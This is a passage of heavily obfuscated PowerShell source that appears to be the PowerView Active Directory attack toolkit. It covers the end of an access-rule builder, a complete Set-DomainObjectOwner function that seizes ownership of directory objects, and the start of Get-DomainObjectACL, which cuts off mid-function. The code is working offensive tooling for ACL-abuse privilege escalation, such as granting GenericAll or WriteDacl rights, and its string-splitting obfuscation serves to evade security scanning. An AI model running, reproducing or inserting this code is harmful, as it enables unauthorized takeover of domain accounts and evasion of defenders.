    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{1}{3}{2}" -f 'PS','ShouldProc','s','es'}, '')]
    [OutputType({"{2}{5}{4}{0}{9}{7}{3}{1}{6}{8}"-f 'c','ho','Sys','t','m.Security.Ac','te','ri','ssControl.Au','zationRule','e'})]
    [CmdletBinding()]
    Param (
        [Parameter(POsitioN = 0, VAlUefROMPIPEline = ${TR`UE}, VAlUEFRoMpiPelInEByPropeRTYNAmE = ${tR`Ue}, maNDAToRy = ${Tr`UE})]
        [Alias({"{1}{2}{0}{3}{4}"-f'guish','Disti','n','edNa','me'}, {"{3}{2}{0}{1}"-f 'a','me','ountN','SamAcc'}, {"{0}{1}" -f'N','ame'})]
        [String]
        ${p`RinCIpalidEnt`I`Ty},

        [ValidateNotNullOrEmpty()]
        [String]
        ${p`RInc`I`Paldo`Main},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{3}{4}{0}{2}"-f 'troll','Doma','er','inC','on'})]
        [String]
        ${se`RVeR},

        [ValidateSet({"{0}{1}"-f'Bas','e'}, {"{1}{0}"-f 'neLevel','O'}, {"{1}{0}{2}" -f 'btr','Su','ee'})]
        [String]
        ${SE`AR`c`hscoPe} = ("{1}{0}{2}" -f't','Sub','ree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${resUL`T`p`A`GESIze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SEr`VE`RtImEliM`it},

        [Switch]
        ${toM`B`sto`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${crEd`E`NTIal} =   ( get-itEM  variABLE:0dSQr  ).VAluE::"eM`PTy",

        [Parameter(mAnDaToRY = ${Tr`UE})]
        [ValidateSet({"{5}{1}{0}{4}{3}{2}"-f'm','te','urity','ec','S','AccessSys'}, {"{2}{1}{0}"-f 'hild','eateC','Cr'},{"{2}{1}{0}"-f'te','le','De'},{"{3}{1}{2}{0}"-f'd','eleteCh','il','D'},{"{1}{2}{0}" -f 'ee','D','eleteTr'},{"{2}{1}{4}{3}{0}" -f'edRight','t','Ex','d','en'},{"{3}{2}{1}{0}"-f 'l','l','A','Generic'},{"{1}{0}{2}{3}{4}" -f 'enericExe','G','cu','t','e'},{"{2}{1}{0}"-f'nericRead','e','G'},{"{1}{3}{2}{0}"-f'Write','Ge','ic','ner'},{"{1}{2}{0}" -f'hildren','L','istC'},{"{2}{0}{1}" -f'Obj','ect','List'},{"{1}{3}{0}{2}"-f 'Cont','Rea','rol','d'},{"{1}{2}{0}" -f 'ty','ReadPrope','r'},{"{1}{0}"-f'f','Sel'},{"{0}{1}{2}"-f'S','y','nchronize'},{"{2}{1}{0}" -f 'eDacl','rit','W'},{"{0}{2}{3}{1}" -f 'W','r','riteOw','ne'},{"{0}{2}{4}{3}{1}"-f'Wri','rty','tePr','e','op'})]
        ${r`i`Ght},

        [Parameter(MANdATORY = ${TR`UE}, PARamETERSEtNaMe="aC`ceS`SRuLetY`PE")]
        [ValidateSet({"{1}{0}"-f 'low','Al'}, {"{0}{1}"-f 'Den','y'})]
        [String[]]
        ${acCESS`c`ON`TROl`TYPE},

        [Parameter(MANDAToRY = ${Tr`UE}, pARAmeterSeTnAME="Au`dI`TrulETy`pE")]
        [ValidateSet({"{2}{0}{1}"-f 'ce','ss','Suc'}, {"{0}{1}{2}" -f 'Failu','r','e'})]
        [String]
        ${A`UditF`L`AG},

        [Parameter(mANdAToRY = ${fAl`sE}, PARAMETErseTNAME="a`cCEssRulE`T`y`PE")]
        [Parameter(MandAtOry = ${FaL`sE}, paRAMEterSETNamE="A`U`dI`TruLET`YpE")]
        [Parameter(MANDaToRY = ${f`Alse}, PAraMetErsetnAME="ObJectgUIdL`o`ok`UP")]
        [Guid]
        ${OB`JeCtt`YpE},

        [ValidateSet('All', {"{2}{0}{1}"-f'e','n','Childr'},{"{1}{0}{2}{3}" -f 's','De','cend','ents'},{"{1}{0}"-f 'one','N'},{"{0}{4}{3}{2}{1}" -f'Sel','ldren','dChi','n','fA'})]
        [String]
        ${IN`hERItaN`c`E`TYPE},

        [Guid]
        ${INHeR`ITeD`ObjEcTtY`PE}
    )

    Begin {
        if (${PriNCIPalIde`N`TI`Ty} -notmatch ("{1}{0}" -f 'S-1-.*','^')) {
            ${prInci`paL`S`E`AR`CherargU`MenTs} = @{
                ("{2}{0}{1}"-f 'nt','ity','Ide') = ${PrIncIP`AL`Id`enT`I`Ty}
                ("{2}{0}{1}" -f'ro','perties','P') = ("{7}{0}{2}{5}{3}{6}{4}{1}"-f'ing','sid','u','me,','ct','ishedna','obje','dist')
            }
            if (${P`SboUNdPaRameT`E`Rs}[("{2}{1}{0}{3}" -f'alDom','incip','Pr','ain')]) { ${pr`i`NCIPALsE`ArCherA`R`gUmE`NTs}[("{1}{0}"-f 'in','Doma')] = ${priNcI`PAlD`OM`Ain} }
            if (${pSbo`UNdpaR`A`mEt`Ers}[("{1}{2}{0}" -f'er','Ser','v')]) { ${prin`CI`p`A`lseArc`hE`Ra`RguMEntS}[("{0}{1}"-f'Ser','ver')] = ${SE`R`VeR} }
            if (${psBO`UND`pAra`ME`TErs}[("{2}{1}{0}"-f 'cope','S','Search')]) { ${P`RInciPA`lseARchERA`R`G`UMeNts}[("{1}{2}{0}" -f'cope','Search','S')] = ${SEarC`hs`CO`pe} }
            if (${PS`BoUNDP`ArameTE`Rs}[("{3}{1}{2}{4}{0}" -f'ize','sultPa','g','Re','eS')]) { ${prI`NciP`ALsEaR`cheRa`R`gUmEN`Ts}[("{2}{1}{0}" -f 'ize','PageS','Result')] = ${rEsu`l`TpaG`e`siZe} }
            if (${pSb`ounDPaR`A`MeT`erS}[("{3}{0}{4}{1}{2}" -f 'er','Tim','eLimit','S','ver')]) { ${prinCIpAl`SEaRcH`ERA`RguM`eN`TS}[("{0}{3}{2}{1}" -f 'Server','t','i','TimeLim')] = ${S`ErvERT`ime`lIMIT} }
            if (${pSBOUN`D`pAR`AmETERs}[("{1}{2}{0}" -f'tone','Tom','bs')]) { ${pRi`N`cIP`ALsEA`R`cHerA`RGu`menTs}[("{2}{1}{0}"-f'one','bst','Tom')] = ${To`mBs`TONE} }
            if (${p`S`BOunDp`ARa`mete`Rs}[("{2}{0}{1}"-f 'nti','al','Crede')]) { ${p`RINC`I`PAl`s`eaRcH`ErA`RguMents}[("{2}{1}{0}"-f'edential','r','C')] = ${c`ReDENT`iAL} }
            ${PR`incI`p`AL} = &("{2}{1}{3}{0}"-f't','-DomainObje','Get','c') @PrincipalSearcherArguments
            if (-not ${PriNc`ip`Al}) {
                throw ('Unab'+'le '+'to'+' '+'re'+'solve '+'princi'+'pal'+': '+"$PrincipalIdentity")
            }
            elseif(${princ`iP`AL}."C`ount" -gt 1) {
                throw ("{1}{9}{10}{8}{12}{5}{7}{6}{4}{2}{0}{11}{3}" -f ' is','Princ','one','wed','ts, but only ','s mult','le AD objec','ip','matc','ipalId','entity ',' allo','he')
            }
            ${OBJEc`T`siD} = ${p`RI`NciPAL}."oBJect`SId"
        }
        else {
            ${ob`JEcT`S`iD} = ${pR`inC`iPaliD`eNTi`Ty}
        }

        ${a`dR`IGHt} = 0
        foreach(${R} in ${r`IG`hT}) {
            ${AD`RiG`hT} = ${AdR`IGHt} -bor (([System.DirectoryServices.ActiveDirectoryRights]${R})."va`luE`__")
        }
        ${AdR`i`gHt} = [System.DirectoryServices.ActiveDirectoryRights]${Ad`RI`ght}

        ${iDeN`T`ITY} = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]${O`Bj`ECts`iD})
    }

    Process {
        if(${P`s`CmDleT}.parAmetersETNAME -eq ("{0}{2}{1}"-f'A','tRuleType','udi')) {

            if(${o`Bj`ecTTy`PE} -eq ${nu`lL} -and ${iN`heRi`TAn`c`ETYpE} -eq  ( ls vAriaBlE:915y  ).VALuE::"eMp`Ty" -and ${i`NheRI`TeDob`jEc`T`TYpe} -eq ${nU`Ll}) {
                &("{0}{2}{1}{3}" -f 'Ne','-Obje','w','ct') ("{7}{5}{2}{12}{0}{10}{11}{3}{8}{1}{6}{9}{4}"-f 'irec','irec','tem','ct','AuditRule','s','tor','Sy','iveD','y','toryS','ervices.A','.D') -ArgumentList ${I`DenTi`Ty}, ${AdR`Ig`Ht}, ${aUd`iT`Flag}
            } elseif(${o`BjECT`TYPe} -eq ${n`ULl} -and ${I`NhErI`TANCEtY`PE} -ne   (  VaRiable  915y).VaLUE::"E`mPTY" -and ${inHeR`Ite`DOBJECtT`y`Pe} -eq ${N`UlL}) {
                &("{1}{0}{2}"-f'je','New-Ob','ct') ("{7}{3}{6}{5}{2}{0}{4}{1}"-f 'ryAud','Rule','yServices.ActiveDirecto','t','it','ector','em.Dir','Sys') -ArgumentList ${ID`e`NTITy}, ${ADr`i`GHt}, ${AU`dITfL`Ag}, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]${InHERiT`A`NceT`y`pE})
            } elseif(${o`BJeCTT`ype} -eq ${N`ULL} -and ${INhERItA`NC`eTY`pe} -ne   $915Y::"E`MPtY" -and ${i`Nh`Er`ItEdo`BJECTtYpe} -ne ${nu`lL}) {
                &("{0}{2}{1}"-f'N','ect','ew-Obj') ("{4}{7}{5}{0}{1}{6}{3}{2}" -f's.Ac','tiveDirect','yAuditRule','r','System.Dir','vice','o','ectorySer') -ArgumentList ${iD`eNT`ity}, ${A`dR`IGHT}, ${AuD`IT`FLag}, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]${iNh`eR`i`TaNcet`ypE}), ${INheRITeDObj`E`CtT`y`PE}
            } elseif(${Obj`Ectt`y`Pe} -ne ${NU`ll} -and ${INhe`RitaNcet`YPe} -eq  (  gEt-CHiLDITem VaRiabLe:915y).valUe::"E`mpty" -and ${INheRi`T`e`DoBj`ECTtYpe} -eq ${N`ULl}) {
                &("{0}{3}{1}{2}"-f 'New-O','je','ct','b') ("{8}{1}{5}{2}{9}{0}{6}{10}{3}{4}{7}" -f'ce','.Directo','Serv','oryAu','dit','ry','s.ActiveDir','Rule','System','i','ect') -ArgumentList ${Ide`NT`Ity}, ${AD`Rig`Ht}, ${aud`I`TFlag}, ${O`BJeCt`TY`Pe}
            } elseif(${O`BjE`cTTY`pe} -ne ${Nu`Ll} -and ${I`NH`e`Ri`TANcetyPE} -ne  (lS  VaRiaBLe:915Y ).VaLue::"e`mpty" -and ${I`Nher`itEDObJeCt`TYPE} -eq ${Nu`LL}) {
                &("{1}{3}{0}{2}" -f 'O','Ne','bject','w-') ("{11}{7}{0}{1}{6}{3}{5}{9}{10}{4}{8}{2}"-f'ryServi','ces.Acti','itRule','e','oryA','Dir','v','tem.Directo','ud','e','ct','Sys') -ArgumentList ${i`d`ENtiTy}, ${aD`RIGHT}, ${a`U`di`TfLaG}, ${obj`e`CTt`YPe}, ${iNHer`IT`An`CetypE}
            } elseif(${Obje`c`TtyPE} -ne ${n`UlL} -and ${i`N`hEriTa`NcetyPE} -ne   $915Y::"e`mPTy" -and ${inh`e`RiT`eDOBJE`CtTYPE} -ne ${n`UlL}) {
                &("{1}{2}{0}"-f't','New-Obj','ec') ("{7}{1}{6}{0}{3}{4}{2}{5}"-f'r','ystem.D','irector','ectoryServi','ces.ActiveD','yAuditRule','i','S') -ArgumentList ${ide`N`TITy}, ${aD`R`IGhT}, ${audI`T`FL`AG}, ${O`BjECT`TYPe}, ${InhEritan`c`eT`Y`pE}, ${InH`E`R`It`edoBJecTtyPe}
            }

        }
        else {

            if(${O`BJe`C`TTypE} -eq ${Nu`lL} -and ${INHeRIt`An`cety`PE} -eq  $915Y::"emP`Ty" -and ${i`NhE`R`ItE`DObjeCt`TYPe} -eq ${n`UlL}) {
                &("{2}{0}{1}" -f 'ew-Obj','ect','N') ("{7}{0}{6}{5}{1}{11}{4}{12}{9}{3}{8}{2}{10}" -f'stem.','ic','u','veDir','s','ectoryServ','Dir','Sy','ectoryAccessR','Acti','le','e','.') -ArgumentList ${ident`i`TY}, ${ADRiG`HT}, ${a`CcEssC`oNT`RolTy`pE}
            } elseif(${Ob`je`cTTY`pe} -eq ${n`Ull} -and ${In`He`RIta`NCEty`pE} -ne  $915Y::"EmP`TY" -and ${I`NHeri`TEd`obJECttype} -eq ${Nu`LL}) {
                &("{0}{2}{1}" -f'New','bject','-O') ("{6}{9}{10}{2}{0}{7}{4}{1}{3}{8}{5}"-f 's.ActiveDir','A','ice','ccess','ctory','e','System.Direct','e','Rul','ory','Serv') -ArgumentList ${IdenT`I`Ty}, ${aDr`IghT}, ${AcceSSCO`N`Tr`olt`yPe}, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]${i`Nhe`RiT`AncETy`pe})
            } elseif(${o`BJE`cTty`Pe} -eq ${N`Ull} -and ${iNH`ERIT`ANc`e`TYPE} -ne  ( Get-vARIaBlE 915y).VaLue::"e`mpty" -and ${in`herItED`ObjE`C`TT`Ype} -ne ${n`ULL}) {
                &("{0}{1}{2}" -f 'New','-Obj','ect') ("{8}{0}{1}{11}{9}{4}{10}{3}{6}{2}{5}{7}" -f 'ys','tem.Directo','ctoryAcc','iveD','vices.Ac','es','ire','sRule','S','Ser','t','ry') -ArgumentList ${id`En`TITy}, ${AD`RiG`ht}, ${ac`ceSS`c`oN`TrOlTypE}, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]${INherI`Ta`N`CETYPe}), ${iN`HER`i`TEdo`BjEcTT`y`Pe}
            } elseif(${obJe`cTt`y`PE} -ne ${N`Ull} -and ${In`HeRiT`AN`CetYPE} -eq  (  CHiLdITem  ("variAbl"+"e:91"+"5Y")  ).VAlUe::"emp`TY" -and ${I`NhE`RiTedOBj`ecttYPE} -eq ${N`ULL}) {
                &("{2}{1}{0}"-f'ct','Obje','New-') ("{11}{3}{4}{7}{9}{13}{1}{5}{0}{2}{8}{10}{6}{12}"-f'i','ctive','r','D','irec','D','ess','toryServi','ecto','ce','ryAcc','System.','Rule','s.A') -ArgumentList ${I`dENTi`TY}, ${A`DR`IGhT}, ${aCCess`cO`NTRolT`YpE}, ${OBjEcTT`Y`PE}
            } elseif(${ob`j`e`CTType} -ne ${nU`ll} -and ${Inhe`RIta`Nce`TYpe} -ne   ( gCI ("varI"+"A"+"B"+"l"+"e:915y")  ).VaLUe::"e`MPty" -and ${iN`HeRIt`e`dOBje`c`TT`yPE} -eq ${n`ULL}) {
                &("{0}{1}{2}" -f 'New','-','Object') ("{3}{4}{8}{10}{0}{9}{1}{12}{7}{2}{5}{6}{11}" -f't','ice','veDir','Sy','stem.Di','ectory','A','i','re','oryServ','c','ccessRule','s.Act') -ArgumentList ${Ide`N`Tity}, ${aD`RIgHT}, ${a`cC`EsSc`oN`TR`OlType}, ${O`B`jE`cttypE}, ${INheRi`T`Anc`Etype}
            } elseif(${o`B`jecTtype} -ne ${N`Ull} -and ${in`H`e`RitaNcetyPE} -ne  $915Y::"em`PTY" -and ${i`Nh`ERI`TEdOBjeCt`T`ype} -ne ${nu`ll}) {
                &("{2}{1}{0}"-f'Object','ew-','N') ("{1}{5}{4}{12}{7}{10}{3}{6}{2}{9}{0}{13}{8}{11}"-f 'veDirecto','S','.Ac','toryServic','m.D','yste','es','re','c','ti','c','cessRule','i','ryA') -ArgumentList ${idEn`T`Ity}, ${AD`R`IgHt}, ${acc`eS`sconTR`OlTYPE}, ${Ob`jE`CttYPE}, ${iN`He`RitA`NCETYpe}, ${I`N`H`eR`I`TEDObJe`cttYpe}
            }

        }
    }
}


function S`eT-DoMAInoBJ`ECto`Wn`eR {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{8}{4}{0}{7}{2}{6}{9}{5}{1}{10}"-f 'P','u','o','PSUs','hould','ngF','cessF','r','eS','orStateChangi','nctions'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{0}{2}"-f'dPr','PSShoul','ocess'}, '')]
    [CmdletBinding()]
    Param(
        [Parameter(POsITioN = 0, mANDAtoRY = ${TR`UE}, vAluEFromPIpeline = ${TR`Ue}, vAlUefROmPIPelInEBYProPeRTYnAmE = ${t`Rue})]
        [Alias({"{0}{3}{2}{1}{4}"-f 'Distin','N','ished','gu','ame'}, {"{1}{2}{0}"-f 'tName','SamAcc','oun'}, {"{1}{0}" -f'me','Na'})]
        [String]
        ${IdE`NT`I`TY},

        [Parameter(MAnDAtOrY = ${Tr`UE})]
        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f 'Own','er'})]
        [String]
        ${OWNeR`idE`NtI`TY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${dOm`A`In},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f'ilter','F'})]
        [String]
        ${l`daPFI`lt`Er},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}"-f'AD','SPath'})]
        [String]
        ${S`EA`RcHbASe},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}{3}"-f'Do','mainCont','rol','ler'})]
        [String]
        ${Se`Rv`er},

        [ValidateSet({"{1}{0}"-f'e','Bas'}, {"{0}{2}{1}" -f'OneLe','l','ve'}, {"{0}{1}{2}" -f 'Su','btre','e'})]
        [String]
        ${S`EArC`Hs`coPE} = ("{1}{2}{0}" -f 'e','Subtr','e'),

        [ValidateRange(1, 10000)]
        [Int]
        ${r`ES`U`LTPaGesI`Ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${seRvErTi`meLi`M`It},

        [Switch]
        ${TOMB`s`T`oNe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`ReD`eNT`IAL} =   (  ls VarIaBLe:0DsQR).VaLUE::"emp`Ty"
    )

    BEGIN {
        ${se`A`RCHE`RAr`gUMENtS} = @{}
        if (${PsB`OU`NdPArAm`ETerS}[("{1}{0}" -f'n','Domai')]) { ${SEarcher`ARg`UMEN`Ts}[("{2}{1}{0}" -f'n','omai','D')] = ${d`Oma`IN} }
        if (${PSBoUnd`para`meT`e`RS}[("{0}{2}{1}" -f 'LD','PFilter','A')]) { ${Se`ArcHe`RARGu`MEnTs}[("{1}{2}{0}"-f 'r','LDAPFi','lte')] = ${lDAp`F`i`lTER} }
        if (${pSbouND`pAR`AMe`TErs}[("{0}{2}{1}"-f'S','ase','earchB')]) { ${s`eaRcHer`A`RG`UmEntS}[("{2}{0}{1}" -f 'hBas','e','Searc')] = ${SEar`cH`BaSe} }
        if (${p`SbOun`Dpa`R`AMETE`RS}[("{0}{2}{1}" -f 'Se','r','rve')]) { ${s`eAR`c`hERA`RguM`enTs}[("{1}{0}" -f'r','Serve')] = ${SE`RVEr} }
        if (${P`sb`O`Un`Dpa`RAmEtErs}[("{1}{0}{3}{2}"-f'a','Se','cope','rchS')]) { ${s`EARCHerA`RgUme`NtS}[("{2}{0}{1}" -f'chSc','ope','Sear')] = ${sE`ArCHsc`opE} }
        if (${psb`OundP`ARame`TErS}[("{1}{0}{2}{3}" -f 'esultPa','R','geSiz','e')]) { ${searC`HERa`RG`UMen`TS}[("{2}{3}{0}{1}"-f'eSiz','e','R','esultPag')] = ${re`S`ULt`Pa`gesizE} }
        if (${pSBouNd`PAr`AME`T`e`Rs}[("{2}{1}{0}{3}"-f'e','rverTim','Se','Limit')]) { ${S`e`ArCheRAR`guME`N`Ts}[("{1}{2}{3}{0}" -f'Limit','Serv','erT','ime')] = ${seR`V`eRTiME`l`IM`IT} }
        if (${PS`B`o`UN`DPaRA`mEtErS}[("{2}{1}{0}" -f 'tone','s','Tomb')]) { ${seA`RcHeRARG`U`M`EnTS}[("{3}{0}{1}{2}"-f'b','s','tone','Tom')] = ${t`OMb`Stone} }
        if (${pSB`ounDPa`RA`mETErs}[("{2}{0}{1}"-f 'ede','ntial','Cr')]) { ${SeArChEr`A`RGUM`e`NtS}[("{0}{2}{1}"-f'C','edential','r')] = ${cre`dEnt`IaL} }

        ${owNeR`sID} = &("{1}{2}{0}{3}" -f 'j','Get-Do','mainOb','ect') @SearcherArguments -Identity ${O`wNe`RiDenT`I`Ty} -Properties ("{1}{0}{2}" -f't','objec','sid') | &("{3}{0}{1}{2}"-f 'ect','-Obj','ect','Sel') -ExpandProperty ("{0}{2}{1}"-f'object','id','s')
        if (${O`wnerSiD}) {
            ${o`wNeRidENTi`T`Yr`EF`eREnce} = [System.Security.Principal.SecurityIdentifier]${OWNe`RS`id}
        }
        else {
            &("{4}{0}{2}{3}{1}" -f'r','g','ni','n','Write-Wa') ('[S'+'e'+'t-Do'+'mai'+'nO'+'bjectOwner'+'] '+'Err'+'or '+'pars'+'i'+'ng '+'ow'+'ner '+'id'+'ent'+'ity '+"'$OwnerIdentity'")
        }
    }

    PROCESS {
        if (${OWne`R`iDEnTItyrE`FeREN`CE}) {
            ${SEA`Rche`RaRgume`NtS}['Raw'] = ${T`Rue}
            ${s`EArCheRArg`U`Me`Nts}[("{1}{2}{0}"-f 'ity','Id','ent')] = ${ID`En`TIty}

            
            ${R`AWOb`jECt} = &("{0}{2}{3}{1}"-f 'Get-Do','nObject','m','ai') @SearcherArguments

            ForEach (${ObJ`e`CT} in ${RA`wOBJ`eCT}) {
                try {
                    &("{3}{4}{2}{1}{0}" -f 'se','Verbo','ite-','W','r') ('[Se'+'t'+'-'+'DomainObje'+'ctO'+'wner] '+'Attempti'+'ng'+' '+'to'+' '+'s'+'et '+'th'+'e '+'owne'+'r '+'fo'+'r '+"'$Identity' "+'to'+' '+"'$OwnerIdentity'")
                    ${e`Nt`RY} = ${r`AWoB`JECT}.("{0}{1}{3}{2}"-f'G','etDirec','ryEntry','to').Invoke()
                    ${E`Nt`RY}."PSBA`sE"."oP`Ti`OnS"."SEc`URIT`y`mA`skS" = ("{1}{0}" -f'er','Own')
                    ${ENt`RY}."Ps`Base"."ObJEcts`EcU`Ri`Ty".("{0}{1}"-f 'SetOw','ner').Invoke(${OWN`ERIDe`NTi`TYReferE`NCe})
                    ${e`NT`Ry}."P`SBa`Se".("{3}{1}{2}{0}" -f'Changes','omm','it','C').Invoke()
                }
                catch {
                    &("{0}{1}{3}{2}"-f'Write','-W','ning','ar') ('[Se'+'t-Do'+'mai'+'n'+'Obj'+'ectOwner] '+'Error'+' '+'set'+'t'+'ing '+'ow'+'n'+'er: '+"$_")
                }
            }
        }
    }
}


function G`e`T-dOmAiNoBjEcT`A`cL {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{2}{0}{4}{1}"-f 'ldPr','s','Shou','PS','oces'}, '')]
    [OutputType({"{3}{0}{1}{2}"-f'owerVie','w.A','CL','P'})]
    [CmdletBinding()]
    Param (
        [Parameter(PosiTION = 0, VALUeFrOmPIpElINE = ${tR`UE}, VaLuEFroMpipElInEByproPerTYNamE = ${TR`UE})]
        [Alias({"{1}{3}{2}{0}"-f'e','Dist','dNam','inguishe'}, {"{1}{0}{3}{2}" -f 'cc','SamA','tName','oun'}, {"{0}{1}"-f'Na','me'})]
        [String[]]
        ${id`ent`itY},

        [Switch]
        ${s`ACL},

        [Switch]
        ${re`SOlVe`Guids},

        [String]
        [Alias({"{0}{1}" -f'Righ','ts'})]
        [ValidateSet('All', {"{0}{2}{1}"-f'Re','Password','set'}, {"{0}{1}{3}{2}"-f'Write','M','bers','em'})]
        ${riG`HtSFIl`TEr},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DO`MA`iN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f'er','Filt'})]
        [String]
        ${ldApf`IL`TEr},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}"-f'ADS','Path'})]
        [String]
        ${S`EaRChB`AsE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}{3}" -f 'Domai','nCont','r','oller'})]
        [String]
        ${sEr`V`Er},

        [ValidateSet({"{1}{0}" -f 'ase','B'}, {"{0}{1}"-f 'On','eLevel'}, {"{0}{1}{2}"-f 'S','ubt','ree'})]
        [String]
        ${seAr`Ch`sCo`pe} = ("{2}{0}{1}" -f 'u','btree','S'),

        [ValidateRange(1, 10000)]
        [Int]
        ${res`ULtP`A`gEsize} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${S`ERVErT`Im`elIMiT},

        [Switch]
        ${to`mb`sToNe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${creDe`N`Ti`Al} =   ( DIr VariAbLE:0dSqr).VAluE::"eMP`TY"
    )

    BEGIN {
        ${sEaRc`H`ERaRgUM`eNTs} = @{
            ("{0}{2}{1}"-f 'Pr','erties','op') = ("{0}{7}{2}{5}{6}{1}{9}{11}{4}{10}{8}{3}"-f's','yde','accountna','sid','stinguished','me,ntsecu','rit','am',',object','scriptor,','name','di')
        }

        if (${PS`BOUNd`P`AramE`TERS}[("{1}{0}"-f 'l','Sac')]) {
            ${se`Ar`cHEr`ARGu`mentS}[("{2}{1}{0}"-f 'Masks','urity','Sec')] = ("{0}{1}" -f'Sa','cl')
        }
        else {
            ${se`ArcHeRaRGum`en`Ts}[("{1}{0}{2}" -f'ecuri','S','tyMasks')] = ("{1}{0}" -f'cl','Da')
        }
        if (${PsB`oUNdpARA`m`e`TErs}[("{1}{0}" -f'n','Domai')]) { ${S`e`ARChEra`RguMeNts}[("{0}{1}" -f'Do','main')] = ${dOm`AiN} }
        if (${P`sbOunD`pARaM`EteRs}[("{2}{1}{0}" -f'ase','hB','Searc')]) { ${seaR`ChErAR`GU`mentS}[("{1}{2}{0}" -f 'e','Searc','hBas')] = ${s`Ear`cHBASe} }
        if (${p`s`Bo`UNDP`A`RAMETerS}[("{0}{1}{2}" -f 'Se','r','ver')]) { ${SeARChE`R`Ar`GU`MENTs}[("{2}{0}{1}" -f 'rv','er','Se')] = ${SER`V`Er} }
        if (${PsBOUNd`PaR`A`meTERS}[("{2}{0}{1}" -f 'earchScop','e','S')]) { ${SeArC`HeRargU`M`ENTs}[("{1}{3}{2}{0}"-f 'hScope','Sea','c','r')] = ${Sear`c`H`scoPe} }
        if (${pSB`ou`Ndp`AR`AMeTers}[("{3}{2}{1}{0}" -f'Size','Page','sult','Re')]) { ${sEArc`h`ErA`RguMeNTS}[("{2}{3}{1}{0}"-f'e','Siz','Resu','ltPage')] = ${Res`Ul`Tpa`geSiZe} }
        if (${p`sB`o`UNdpAR`AM`EteRs}[("{2}{0}{1}"-f'erTi','meLimit','Serv')]) { ${SeARche`RaRg`Ume`N`TS}[("{4}{2}{3}{0}{1}"-f'rTimeLim','it','rv','e','Se')] = ${SER`VERT`i`M`eLiMIT} }
        if (${p`sB`oUn`dPaRAme`TERs}[("{1}{2}{0}"-f'ne','Tombst','o')]) { ${s`eAr`Ch`ERa`RgUme`NTS}[("{0}{1}{2}" -f 'Tombst','o','ne')] = ${TO`mbS`T`one} }
        if (${psb`OuND`PArA`MET`erS}[("{0}{1}{2}" -f 'Crede','nti','al')]) { ${s`eArChERARg`UMEN`Ts}[("{0}{1}{2}"-f 'Cre','d','ential')] = ${c`REDenT`IAl} }
        ${SeARC`HER} = &("{4}{3}{1}{2}{0}" -f'her','ear','c','nS','Get-Domai') @SearcherArguments

        ${DomaI`Ng`Ui`dm`ApArGume`N`TS} = @{}
        if (${pSBoUnDP`ARA`Met`e`RS}[("{1}{0}{2}" -f'ma','Do','in')]) { ${dOmaIN`G`U`IdmAP`A`RgUmeN`TS}[("{1}{0}"-f 'ain','Dom')] = ${dO`MAIN} }
        if (${Ps`Bo`Un`DParamEtErs}[("{1}{2}{0}"-f 'r','Ser','ve')]) { ${doMAINguidMaP`A`R`guMEN`TS}[("{2}{1}{0}"-f 'ver','er','S')] = ${SeR`V`Er} }
        if (${PSboUnd`PARa`mEte`RS}[("{1}{0}{3}{4}{2}"-f 'u','Res','e','lt','PageSiz')]) { ${dOMai`NgUidMa`PA`RGUM`EntS}[("{2}{0}{1}{3}"-f'ul','tP','Res','ageSize')] = ${reSulTPa`gESi`zE} }
        if (${PsB`oUnDpa`Ram`eteRs}[("{1}{3}{0}{4}{2}" -f'verT','S','meLimit','er','i')]) { ${doma`in`Gui`dma`P`Arg`UMenTS}[("{1}{3}{2}{0}{4}" -f'imi','S','imeL','erverT','t')] = ${SE`Rv`ert`IMELI`mit} }
        if (${PS`Bound`paRaMeT`ERS}[("{0}{2}{1}"-f 'Cre','ential','d')]) { ${d`omAi`NGuIDmAp`ARgUM`en`TS}[("{2}{0}{1}{3}" -f 'red','enti','C','al')] = ${CrE`D`e`NTIAL} }

        
        if (${PsBO`U`ND`PArAmeTeRS}[("{0}{1}{3}{2}" -f'R','eso','veGUIDs','l')]) {
            ${gU`iDs} = &("{3}{4}{1}{5}{2}{0}" -f 'ainGUIDMap','t','m','G','e','-Do') @DomainGUIDMapArguments
        }
    }

    PROCESS {
        if (${SE`ARc`heR}) {
            ${I`D`eN`T`itYfILTeR} = ''
            ${FiL`TEr} = ''
            ${Id`ENt`iTY} | &("{1}{2}{0}" -f't','W','here-Objec') {${_}} | &("{3}{1}{0}{2}"-f'Obj','ach-','ect','ForE') {
                ${iDeNtIT`yIn`s`T`AncE} = ${_}.("{0}{1}"-f 'Repla','ce').Invoke('(', '\28').("{1}{0}"-f'ace','Repl').Invoke(')', '\29')
                if (${iDeNtI`T`YinsT`Ance} -match ("{2}{0}{1}" -f'S','-1-.*','^')) {
                    ${i`DeN`T`ItYFIlTER} += "(objectsid=$IdentityInstance)"
                }
                elseif (${iDen`Tity`iNsT`AnCE} -match ((("{1}{2}{3}{4}{0}" -f '=.*','^(CNh','kD','OU','hkDDC)')) -cREpLAce  'hkD',[CHaR]124)) {
                    ${I`dentI`TYfi`Lt`Er} += "(distinguishedname=$IdentityInstance)"
